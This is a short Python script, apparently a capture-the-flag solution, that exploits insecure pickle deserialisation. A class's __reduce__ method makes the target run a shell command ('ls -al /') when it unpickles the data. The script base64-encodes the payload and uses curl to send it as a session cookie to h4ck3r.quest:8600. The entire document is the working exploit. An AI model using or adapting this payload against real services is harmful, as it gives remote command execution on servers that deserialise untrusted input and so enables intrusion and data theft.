import pickle
import os
import pickletools
import base64

class exploit(object):
    def __reduce__(self):
        return (__import__('subprocess').getoutput, ('ls -al /',))
    

serialized = pickle.dumps({
        "name": '123',
        "age": exploit()
        })
optim_s = pickletools.optimize(serialized)

cookie = base64.b64encode(optim_s).decode()

os.system(f"curl http://h4ck3r.quest:8600/ --cookie 'session={cookie}'")